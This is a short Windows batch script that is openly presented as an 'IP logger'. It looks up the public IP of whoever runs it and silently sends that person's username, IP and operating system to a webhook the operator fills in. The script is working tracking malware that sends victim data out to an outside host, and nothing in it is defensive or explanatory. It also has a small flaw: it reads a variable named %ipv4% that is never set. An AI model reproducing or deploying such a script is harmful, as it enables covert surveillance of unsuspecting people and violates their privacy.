@echo off
:: WEBHOOK
set webhook=[WEBHOOK HERE WITHOUT BRACKETS]

:: GETTING THE IP
curl ifconfig.co/>ip&cls&set/p ip=<ip

:: CUSTOM MESSAGE
set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 

:: SENDING THE MESSAGE
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
